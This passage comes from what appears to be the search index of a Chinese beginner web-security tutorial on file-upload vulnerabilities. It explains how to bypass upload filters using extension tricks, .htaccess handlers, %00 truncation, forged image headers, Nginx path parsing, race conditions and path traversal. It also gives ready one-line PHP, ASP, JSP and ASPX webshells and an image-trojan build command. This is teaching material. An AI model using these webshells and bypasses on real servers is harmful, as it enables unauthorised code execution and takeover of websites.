<p>\u5728Apache\u7684\u89e3\u6790\u987a\u5e8f\u4e2d\uff0c\u662f\u4ece\u53f3\u5230\u5de6\u5f00\u59cb\u89e3\u6790\u6587\u4ef6\u540e\u7f00\u7684\uff0c\u5982\u679c\u6700\u53f3\u4fa7\u7684\u6269\u5c55\u540d\u4e0d\u53ef\u8bc6\u522b\uff0c\u5c31\u7ee7\u7eed\u5f80\u5de6\u5224\u65ad\uff0c\u76f4\u5230\u9047\u5230\u53ef\u4ee5\u89e3\u6790\u7684\u6587\u4ef6\u540e\u7f00\u4e3a\u6b62\u3002\u56e0\u6b64\uff0c\u4f8b\u5982\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\u4e3a1.php.xxxx\uff0c\u56e0\u4e3a\u540e\u7f00xxxx\u4e0d\u53ef\u89e3\u6790\uff0c\u6240\u4ee5\u5411\u5de6\u89e3\u6790\u540e\u7f00php\u3002</p> <p>\u4f8b\u5982\uff1a<code>shell.php.ddd.1d21</code> -&gt;<code>shell.php</code></p> </li> <li> <p>Nginx</p> <p>\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u786e\u4fdd\u7c7b\u4f3c\u89c4\u5219</p> <pre><code>location \\~ \\.(php|php3|phtml)$ {\n    fastcgi_pass unix:/var/run/php-fpm.sock; \n    #...\u5176\u4ed6FastCGI\u53c2\u6570\n}\n</code></pre> </li> </ul> \u8bed\u8a00 \u7b49\u4ef7\u6269\u5c55\u540d asp asa\uff0ccer\uff0ccdx aspx ashx\uff0casmx\uff0cascx php php2\u3001php3\u3001php4\u3001php5\u3001phps\uff0cpht\uff0cphtml jsp jspx\uff0cjspf"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#phtml","title":"phtml\u6587\u4ef6","text":"<p>\u5728\u5d4c\u5165\u4e86php\u811a\u672c\u7684html\u4e2d\uff0c\u4f7f\u7528 phtml\u4f5c\u4e3a\u540e\u7f00\u540d\uff0cweb\u670d\u52a1\u5668\u4f1a\u7528php\u89e3\u91ca\u5668\u8fdb\u884c\u89e3\u6790  </p> <p>.phtml\u662fPHP 2\u7a0b\u5e8f\u7684\u6807\u51c6\u6587\u4ef6\u6269\u5c55\u540d\u3002 .php3\u63a5\u7ba1\u4e86PHP 3.\u5f53PHP 4\u51fa\u6765\u65f6\uff0c\u4ed6\u4eec\u5207\u6362\u5230\u76f4\u63a5.php\u3002</p> <p>\u8f83\u65e7\u7684\u6587\u4ef6\u6269\u5c55\u540d\u6709\u65f6\u4ecd\u88ab\u4f7f\u7528\uff0c\u4f46\u5e76\u4e0d\u5e38\u89c1\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_4","title":"\u7ed5\u8fc7\u540e\u7f00\u540d\u68c0\u6d4b","text":"<p>\u51e0\u79cd\u57fa\u672c\u65b9\u5f0f</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_5","title":"\u7279\u6b8a\u6587\u4ef6\u540d","text":"<p>\u5728\u6587\u4ef6\u540d\u540e\u9762\u52a0 \u201c.\u201d\u6216\u7a7a\u683c\uff0c<code>windows</code>\u5728\u4fdd\u5b58\u6587\u4ef6\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u5c06\u70b9\u201c.\u201d\u548c\u7a7a\u683c\u53bb\u6389</p> <p>\u6587\u4ef6\u540e\u7f00\u540d\u540e\u52a0<code>::$DATA</code>\uff0c<code>windows</code>\u4f1a\u628a<code>::$DATA</code>\u540e\u7684\u5185\u5bb9\u5f53\u6210\u6587\u4ef6\u6d41\u5904\u7406\u4e14\u4fdd\u7559\u5176\u524d\u9762\u7684\u540e\u7f00\u540d</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_6","title":"\u5927\u5c0f\u5199","text":"<p>\u5c06\u6587\u4ef6\u7684\u540e\u7f00\u540d\u5927\u5c0f\u5199\u6df7\u6742\u5982\uff1a<code>*.pHp</code> <code>*.aSP</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_7","title":"\u53cc\u5199","text":"<p>\u6587\u4ef6\u540d\u53cc\u5199\u7ed5\u8fc7\uff0c\u5982\uff1a<code>*.pphphp</code>\u3002\u9002\u7528\u4e8e\u7ed5\u8fc7<code>str_irepalce</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_8","title":"\u540d\u5355\u5217\u8868\u7ed5\u8fc7","text":"<p>\u5982\uff1a<code>*.asa</code> <code>*.cer</code>\u8fd9\u4e9b\u662f\u975e\u6807\u51c6\u6269\u5c55\u540d\uff0c\u53ef\u80fd\u88ab\u670d\u52a1\u7aef\u89e3\u6790\u4e3a\u53ef\u6267\u884c\u811a\u672c</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#htaccess","title":"<code>.htaccess</code>\u914d\u7f6e\u6587\u4ef6","text":"<p>\u524d\u63d0\uff1a\u670d\u52a1\u5668\u914d\u7f6e\u5141\u8bb8 <code>.htaccess</code> \u8986\u76d6\u89c4\u5219\uff08<code>AllowOverride All</code> \u6216\u81f3\u5c11 <code>AllowOverride FileInfo</code>\uff09</p> <p><code>.htaccess</code>\uff08hypertest access\u8d85\u6587\u672c\u5165\u53e3\uff09\uff0c\u662f\u4e00\u4e2aphp\u7684\u52a8\u6001\u7f51\u7ad9</p> <p>\u4ee5\u543e\u7231\u7834\u89e3\u5b98\u7f51\u4e3a\u4f8b\uff0c\u6b63\u5e38\u57df\u540d\u4e3ahttps://52pojie.cn/thread.php?id=134974&amp;page=1</p> <p>\u800c\u52a8\u6001\u7f51\u7ad9\u7684\u7ea2\u5b57\u90e8\u5206\u4e3a<code>thread-134974-1-1.html</code>\uff0c\u4ee5\u4fbf\u641c\u7d22\u5f15\u64ce\u7684\u6536\u5f55</p> <p>\u901a\u8fc7<code>.htaccess</code>\u6587\u4ef6\uff0c\u53ef\u4ee5\u5e2e\u6211\u4eec\u5b9e\u73b0\u7528\u6237\u91cd\u5b9a\u5411\u3001\u81ea\u5b9a\u4e49\u9519\u8bef\u9875\u9762\u3001\u66f4\u6539\u6269\u5c55\u540d\u3001\u4ee5\u53ca\u4f7f\u7528\u5176\u4ed6\u6587\u4ef6\u4f5c\u4e3aindex\u6587\u4ef6\u7b49\uff0c\u5982\u679c\u4e00\u4e2aweb\u5e94\u7528\u5141\u8bb8\u4e0a\u4f20<code>.htaccess</code>\u6587\u4ef6\uff0c\u90a3\u5c31\u610f\u5473\u7740\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u8fdb\u884c\u66f4\u6539<code>Apache</code>\u7684\u914d\u7f6e</p> <p>\u5229\u7528<code>.htaccess</code>\u6587\u4ef6\u53ef\u4ee5\u6307\u5b9a\u6587\u4ef6\u4ee5\u4ec0\u4e48\u7c7b\u578b\u8bbf\u95ee\uff0c\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u53ef\u4ee5\u8ba9<code>jpg</code>\u4ee5<code>php</code>\u7684\u65b9\u5f0f\u8fd0\u884c\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u8fbe\u5230\u7ed5\u8fc7\u7684\u76ee\u7684\u3002</p> <p><code>.htaccess</code>\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u6307\u4ee4\u4f5c\u7528\u4e8e<code>.htaccess</code>\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\u53ca\u5176\u6240\u6709\u5b50\u76ee\u5f55\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5176\u4e0a\u7ea7\u76ee\u5f55\u4e5f\u53ef\u80fd\u4f1a\u6709.htaccess\u6587\u4ef6\uff0c\u800c\u6307\u4ee4\u662f\u6309\u67e5\u627e\u987a\u5e8f\u4f9d\u6b21\u751f\u6548\u7684\uff0c\u6240\u4ee5\u4e00\u4e2a\u7279\u5b9a\u76ee\u5f55\u4e0b\u7684.htaccess\u6587\u4ef6\u4e2d\u7684\u6307\u4ee4\u53ef\u80fd\u4f1a\u8986\u76d6\u5176\u4e0a\u7ea7\u76ee\u5f55\u4e2d\u7684.htaccess\u6587\u4ef6\u4e2d\u7684\u6307\u4ee4\uff0c\u5373\u5b50\u76ee\u5f55\u4e2d\u7684\u6307\u4ee4\u4f1a\u8986\u76d6\u7236\u76ee\u5f55\u6216\u8005\u4e3b\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u6307\u4ee4\u3002</p> <p>\u7b80\u5355\u5e94\u7528</p> <p>\u4e0a\u4f20\u6587\u4ef6<code>.htaccess</code>\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>&lt;FilesMatch \"oasis\"&gt; \nSetHandler application/x-httpd-php //\u5c06\u540e\u9762\u7684\u6587\u4ef6\u5168\u90e8\u89e3\u6790\u6210php\u6267\u884c \n&lt;/FilesMatch&gt;\n</code></pre> <p>\u4e0a\u4f20\u5b8c\u4e4b\u540e\uff0c\u518d\u6b21\u4e0a\u4f20\u6587\u4ef6\u540d\u4e3aoasis\u7684\u6587\u4ef6\u5c06\u88ab\u89e3\u6790\u4e3aphp\u6267\u884c</p> <p>\u6ce8\u610f\uff1a\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\u53d6\u51b3\u4e8e\u4f60\u4e0a\u4f20\u7684htaccess\u5185\u5199\u7684\u5185\u5bb9\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#00","title":"%00\u622a\u65ad","text":"<p>\u524d\u63d0</p> <ul> <li>PHP \u7248\u672c &lt; 5.3.4\uff08\u540e\u7eed\u7248\u672c\u4fee\u590d\u4e86 <code>%00</code> \u622a\u65ad\u6f0f\u6d1e\uff09\u3002</li> <li><code>magic_quotes_gpc = Off</code> \uff08\u5426\u5219 <code>%00</code> \u4f1a\u88ab\u8f6c\u4e49\u4e3a <code>\\0</code>\uff0c\u65e0\u6cd5\u622a\u65ad\uff09\u3002</li> </ul> <p>\u539f\u7406\uff1aphp\u7684\u4e00\u4e9b\u51fd\u6570\u7684\u5e95\u5c42\u662fC\u8bed\u8a00\uff0c\u800c<code>move_uploaded_file</code>\u5c31\u662f\u5176\u4e2d\u4e4b\u4e00\uff0c\u9047\u5230<code>0x00</code>\u5373<code>\\0</code>\u4f1a\u622a\u65ad\uff08\u4f5c\u7528\u76f8\u5f53\u4e8e\u7ed3\u675f\u7b26\uff0c\u4f1a\u5728\u622a\u65ad\u5904\u505c\u6b62\u8bfb\u53d6\u540e\u9762\u7684\u5185\u5bb9\uff09\uff0c0x\u8868\u793a16\u8fdb\u5236\uff0cURL\u4e2d<code>%00</code>\u89e3\u7801\u621016\u8fdb\u5236\u5c31\u662f0x00\u3002  \u800c php\u8bfb\u53d6\u7684\u65b9\u5f0f\u662f\u4ece\u540e\u5f80\u524d\u8bfb\u53d6\uff0c\u9047\u52300x00\u65f6\u505c\u6b62 \uff0c\u6545</p> <p><code>%00</code>\u622a\u65ad\u5206\u4e3aget\u63d0\u4ea4\u548cpost\u63d0\u4ea4\u4e24\u7c7b\uff0c\u533a\u522b\u5728\u4e8e\u5bf9\u4e8e<code>%00</code>\u7684\u5904\u7406\u4e0a\u6709\u6240\u4e0d\u540c\uff0c\u4f7f\u7528POST\u4f20\u5730\u5740\uff0cpost\u4e0d\u4f1a\u50cfget\u5bf9<code>%00</code>\u8fdb\u884c\u81ea\u52a8\u89e3\u7801\uff0c\u9700\u8981\u624b\u52a8\u5b8c\u6210\uff08\u4fdd\u6301 <code>%00</code> \u4e3a URL \u7f16\u7801\uff0c\u4e0d\u80fd\u89e3\u7801\uff09</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_9","title":"\u6587\u4ef6\u5934\uff08\u5185\u5bb9\uff09\u68c0\u6d4b","text":"<p>\u8981\u7ed5\u8fc7\u6587\u4ef6\u5934\u68c0\u6d4b\u5c31\u8981\u5728\u6587\u4ef6\u5f00\u5934\u5199\u4e0a\u5982\u4e0b\u7684\u503c</p> <pre><code>.jpg    FF D8 FF E0 00 10 4A 46 49 46\n.gif    47 49 46 38 39 61\n.png    89 50 4E 47\n</code></pre> <p>\u56fe\u50cf\u5185\u5bb9\u68c0\u6d4b\u5e38\u7528\u7684\u662f<code>getimagesize()</code>\u51fd\u6570\uff0c\u9700\u8981\u628a\u6587\u4ef6\u5934\u90e8\u5206\u4f2a\u9020\uff0c\u4e5f\u5c31\u662f\u5728\u7ed5\u8fc7\u6587\u4ef6\u5934\u68c0\u6d4b\u7684\u57fa\u7840\u4e0a\u8fd8\u52a0\u4e86\u4e00\u4e9b\u6587\u4ef6\u4fe1\u606f\u3002</p> <p>\u5efa\u8bae\u76f4\u63a5\u5236\u9020\u4e00\u4e2a\u56fe\u7247\u9a6c</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>GIF89a\n(...some binary data for image...)\n&lt;?php phpinfo(); ?&gt;\n(... skipping the rest of binary data ...)\n</code></pre> <p>\u53e6\u4e00\u79cd\u662f\u5224\u65ad\u662f\u5426\u5305\u542b<code>&lt;?</code>\u6216\u8005<code>php</code></p> <p>\u7ed5\u8fc7<code>&lt;?</code>\uff1a</p> <pre><code>&lt;script language='php'&gt;@eval($_POST[cmd]);&lt;/script&gt;\n</code></pre> <p>\u7ed5\u8fc7<code>php</code>\uff1a</p> <pre><code>&lt;?= @eval($_POST['cmd']);?&gt;\n</code></pre> <p>\u7ed5\u8fc7\u65b9\u6cd5\uff1a</p> <ul> <li>\u5bf9\u6e32\u67d3/\u52a0\u8f7d\u6d4b\u8bd5\u7684\u653b\u51fb\u65b9\u5f0f\u662f\u4ee3\u7801\u6ce8\u5165\u7ed5\u8fc7\u3002\u4f7f\u7528winhex\u5728\u4e0d\u7834\u574f\u6587\u4ef6\u672c\u8eab\u7684\u6e32\u67d3\u60c5\u51b5\u4e0b\u627e\u4e00\u4e2a\u7a7a\u767d\u533a\u8fdb\u884c\u586b\u5145\u4ee3\u7801\uff0c\u4e00\u822c\u4e3a\u56fe\u7247\u7684\u6ce8\u91ca\u533a\u3002</li> <li>\u5bf9\u4e8c\u6b21\u6e32\u67d3\u7684\u653b\u51fb\u65b9\u5f0f\u5c31\u662f\u653b\u51fb\u6587\u4ef6\u52a0\u8f7d\u5668\u81ea\u8eab\u3002\u4f8b\u5982\uff1a</li> </ul> <pre><code>\u4e0a\u4f20\u6587\u4ef6\u6570\u636e\u4e0d\u5b8c\u6574\u7684gif\u6587\u4ef6 -&gt; \u89e6\u53d1\u62a5\u9519imagecreatefromgif()\u51fd\u6570\n\u4e0a\u4f20\u6587\u4ef6\u6570\u636e\u4e0d\u5b8c\u6574\u7684png\u6587\u4ef6 -&gt; \u89e6\u53d1\u62a5\u9519imagecreatefrompng()\u51fd\u6570\n</code></pre> <p>\u5bf9\u6587\u4ef6\u52a0\u8f7d\u5668\u8fdb\u884c\u653b\u51fb\uff0c\u5e38\u89c1\u7684\u5c31\u662f\u6ea2\u51fa\u653b\u51fb\u3002\u4e0a\u4f20\u81ea\u5df1\u7684\u6076\u610f\u6587\u4ef6\u540e\uff0c\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u52a0\u8f7d\u5668\u4f1a\u4e3b\u52a8\u8fdb\u884c\u52a0\u8f7d\u6d4b\u8bd5\uff0c\u52a0\u8f7d\u6d4b\u8bd5\u65f6\u88ab\u6ea2\u51fa\u653b\u51fb\u6267\u884cshellcode\uff0c\u6bd4\u5982access/mdb\u6ea2\u51fa\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_10","title":"\u89e3\u6790\u6f0f\u6d1e","text":"<p>\u4e3b\u8981\u6709\u76ee\u5f55\u89e3\u6790\u3001\u6587\u4ef6\u89e3\u6790\uff0cApache\u89e3\u6790\u6f0f\u6d1e\u3001Nginx\u89e3\u6790\u6f0f\u6d1e\u3001IIS7.5\u89e3\u6790\u6f0f\u6d1e\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_11","title":"\u76ee\u5f55\u89e3\u6790","text":"<p>\u57fa\u672c\u6ca1\u7528\u4e86</p> <p>\u539f\u7406\uff1a\u670d\u52a1\u5668\u4f1a\u9ed8\u8ba4\u628a <code>.asp</code> \u548c <code>.asp</code>\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u90fd\u89e3\u6790\u6210asp\u6587\u4ef6</p> <p>\u5f62\u5f0f\uff1a<code>www.xxx.com/xxx.asp/xxx.jpg</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_12","title":"\u6587\u4ef6\u89e3\u6790","text":"<p>\u57fa\u672c\u6ca1\u7528\u4e86</p> <p>\u539f\u7406\uff1a\u670d\u52a1\u5668\u9ed8\u8ba4\u4e0d\u89e3\u6790<code>;</code>\u540e\u9762\u7684\u5185\u5bb9\uff0c\u56e0\u6b64<code>xxx.asp;jpg</code>\u88ab\u89e3\u6790\u4e3a<code>xxx.asp</code>\u6587\u4ef6\u4e86</p> <p><code>www.xxx.com/xxx.asp;.jpg</code></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#apache","title":"Apache\u89e3\u6790\u6f0f\u6d1e","text":"<p>\u5176\u5b9e\u5c31\u662f\u7b49\u4ef7\u6269\u5c55\u540d</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#nginx","title":"Nginx\u89e3\u6790\u6f0f\u6d1e","text":"<p>Nginx\u9ed8\u8ba4\u662f\u4ee5<code>FastCGI</code>\u7684\u65b9\u5f0f\u652f\u6301PHP\u89e3\u6790\u7684</p> <p>\u666e\u904d\u7684\u505a\u6cd5\u662f\u5728Nginx\u914d\u7f6e\u6587\u4ef6\u4e2d\u901a\u8fc7 \u6b63\u5219\u5339\u914d\u8bbe\u7f6eSCRIPT_FILENAME\u3002</p> <p>\u5f53\u8bbf\u95ee<code>www.xxx.com/phpinfo.jpg/1.php</code>\u8fd9\u4e2a URL\u65f6</p> <p><code>$fastcgi_script_name</code>\u4f1a\u88ab\u8bbe\u7f6e\u4e3a<code>\u201cphpinfo.jpg/1.php\u201d</code></p> <p>\u7136\u540e\u6784\u9020\u6210 <code>SCRIPT_FILENAME</code>\u4f20\u9012\u7ed9<code>PHP CGI</code>\u3002</p> <p>\u539f\u56e0\u662f\u5f00\u542f\u4e86 <code>fix_pathinfo</code> \u8fd9\u4e2a\u9009\u9879\u5373<code>fix_pathinfo=1</code></p> <p>\u4f1a\u89e6\u53d1 \u5728PHP\u4e2d\u7684\u5982\u4e0b\u903b\u8f91\uff1a PHP\u4f1a\u8ba4\u4e3a<code>SCRIPT_FILENAME</code>\u662f<code>phpinfo.jpg</code>\uff0c\u800c<code>1.php</code>\u662f<code>PATH_INFO</code>\uff0c\u6240\u4ee5\u5c31\u4f1a \u5c06<code>phpinfo.jpg</code>\u4f5c\u4e3aPHP\u6587\u4ef6\u6765\u89e3\u6790\u4e86\u3002</p> <p>\u653b\u51fb\u65b9\u5f0f</p> <ol> <li> <p>\u5f62\u5f0f\uff1a <code>www.xxxx.com/UploadFiles/image/1.jpg/1.php</code> <code>www.xxxx.com/UploadFiles/image/1.jpg%00.php</code> <code>www.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php</code></p> </li> <li> <p>\u53e6\u4e00\u79cd\u65b9\u6cd5\uff1a\u4e0a\u4f20\u4e00\u4e2a\u540d\u5b57\u4e3atest.jpg\uff0c\u7136\u540e\u8bbf\u95ee<code>test.jpg/.php</code>,\u5728\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u5c31\u4f1a\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6cshell.php\u3002</p> </li> </ol>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_13","title":"\u6761\u4ef6\u7ade\u4e89","text":"<p>\u4e00\u4e9b\u7f51\u7ad9\u4e0a\u4f20\u6587\u4ef6\u7684\u903b\u8f91\u65f6\u5148\u5141\u8bb8\u4e0a\u4f20\u4efb\u610f\u6587\u4ef6\uff0c\u7136\u540e\u68c0\u67e5\u4e0a\u4f20\u6587\u4ef6\u7684\u6587\u4ef6\u662f\u5426\u5305\u542bWebShell\u811a\u672c\u5982\u679c\u5305\u542b\u5219\u5220\u9664\u8be5\u6587\u4ef6\u3002</p> <p>\u8fd9\u91cc\u5b58\u5728\u7684\u95ee\u9898\u662f\u6587\u4ef6\u4e0a\u4f20\u6210\u529f\u540e\u548c\u5220\u9664\u6587\u4ef6\u4e4b\u95f4\u5b58\u5728\u4e00\u4e2a\u77ed\u6682\u7684\u65f6\u95f4\u5dee\uff08\u56e0\u4e3a\u9700\u8981\u6267\u884c\u68c0\u67e5\u6587\u4ef6\u548c\u5220\u9664\u6587\u4ef6\u7684\u64cd\u4f5c\uff09\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u65f6\u95f4\u5dee\u5b8c\u6210\u7ade\u4e89\u6761\u4ef6\u7684\u4e0a\u4f20\u6f0f\u6d1e\u653b\u51fb\u3002</p> <p>\u8bd5\u8bd518\u5c81\u7684\u624b\u901f\uff1f</p> <p>\u53ef\u4ee5\u5728\u5e76\u53d1\u7684\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u811a\u672c\u4e0a\u4f20\u6587\u4ef6\uff0c\u4e00\u4e2a\u8bbf\u95ee\u6587\u4ef6</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_14","title":"\u8def\u5f84\u7a7f\u8d8a","text":"<p>\u5f62\u5f0f\uff1a\u4e0a\u4f20\u7684\u6587\u4ef6\u4f1a\u88ab\u89e3\u6790\u4e3a\u65e5\u5fd7\u4e0d\u80fd\u6267\u884c\uff0c\u7ed9\u51fa\u4e86<code>/uploads/xxx.php</code>\u8def\u5f84\u5e76\u4e14\u53ef\u4ee5\u67e5\u8be2</p> <p>\u7ed5\u8fc7\uff1a\u4e0a\u4f20\u6587\u4ef6\u7684\u65f6\u5019\u6293\u5305\uff0c\u4fee\u6539\u6587\u4ef6\u540d\uff08filename\uff09\u4e3a<code>./../../../../flag</code>\uff0c\u4e0a\u4f20\u6210\u529f\u540e\u8def\u5f84\u53d8\u4e3a<code>/uploads/./../../../../flag</code>\u5373\u53ef\u8fdb\u884c\u76ee\u5f55\u7a7f\u8d8a\uff0c\u4ece\u800c\u83b7\u53d6\u6240\u9700\u4fe1\u606f\uff0c\u5982flag</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_15","title":"\u56fe\u7247\u9a6c\u5236\u4f5c","text":"<p>\u7528window\u4e0b\u7684cmd\u5236\u4f5c\uff1a</p> <p><code>copy  meinv.png /b + muma.php /a  muma.png</code></p> <p>\u5176\u4e2d/b\u4ee3\u8868\u4e8c\u8fdb\u5236\u6587\u4ef6<code>binary</code>\uff0c\u653e\u5728\u56fe\u7247\u540e\u9762\uff0c/a\u4ee3\u8868\u6587\u5b57\u6587\u4ef6<code>ascii</code></p> <p>\u4e5f\u53ef\u4ee5\u7528010editor\u76f4\u63a5\u5c06\u4e00\u53e5\u8bdd\u9a6c\u5199\u5728\u6587\u4ef6\u5c3e\u7684\u540e\u9762</p> <p>\u8865\u5145\uff1a\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u6570\u636e\u5305\u7684\u6570\u636e\uff0c\u65b9\u6cd5\u591a\u79cd\u591a\u6837\uff0c\u4e0d\u8981\u5c40\u9650</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/#_16","title":"\u5e38\u7528\u653b\u51fb\u4ee3\u7801","text":"<p>\u7b80\u5355\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <pre><code>&lt;?php @eval($_POST['cmd']);?&gt;\n</code></pre> <p>\u7ed5\u8fc7<code>&lt;?</code>\u9650\u5236\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <pre><code>&lt;script language = 'php'&gt;@eval($_POST[cmd]);&lt;/script&gt;\n</code></pre> <p>\u7ed5\u8fc7<code>&lt;?php ?&gt;</code>\u9650\u5236\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <pre><code>&lt;?= @eval($_POST['cmd']);\n</code></pre> <p>asp\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <pre><code>&lt;%eval(Request.Item[\"cmd\"],\u201dunsafe\u201d);%&gt;\n</code></pre> <p>JSP\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <pre><code>&lt;%if(request.getParameter(\"f\")!=null)(newjava.io.FileOutputStream (application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write (request.getParameter(\"t\").getBytes());%&gt;\n</code></pre> <p>ASPX\u4e00\u53e5\u8bdd</p> <pre><code>&lt;script language=\"C#\"runat=\"server\"&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(\"add6bb58e139be10\")&lt;/script&gt;\n</code></pre> <p>\u9664\u6b64\u4e4b\u5916\u8fd8\u53ef\u4ee5\u7528 \u5f02\u6216\u53d6\u53cd\u7b49\u64cd\u4f5c\u5199shell\u7684php\u811a\u672c\u3001\u6df7\u6dc6\u6728\u9a6c\u3001\u4e0d\u6b7b\u9a6c\u3002</p> <p>\u53c2\u8003</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87/","title":"\u6587\u4ef6\u5305\u542b","text":"<p> \u7ea6 1985 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Note</p> <p>\u671f\u5f85\u8865\u5145</p> <p>\u6f0f\u6d1e\u548c\u7b80\u6790</p> <p>\u5185\u5bb9\u4e3b\u8981\u662fphp\u5305\u542b\u6587\u4ef6\u7684\u51fd\u6570\u6f0f\u6d1e</p> <p>\u5176\u539f\u7406\u662f\u670d\u52a1\u5668\u89e3\u6790\u6267\u884cphp\u6587\u4ef6\u65f6\u80fd\u591f\u901a\u8fc7\u5305\u542b\u51fd\u6570\u52a0\u8f7d\u53e6\u5916\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684php\u4ee3\u7801\uff0c\u5f53\u88ab\u5305\u542b\u7684\u6587\u4ef6\u4e2d\u5b58\u5728\u6728\u9a6c\u65f6\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u6728\u9a6c\u7a0b\u5e8f\u4f1a\u5728\u670d\u52a1\u5668\u4e0a\u52a0\u8f7d\u6267\u884c\u3002 </p> 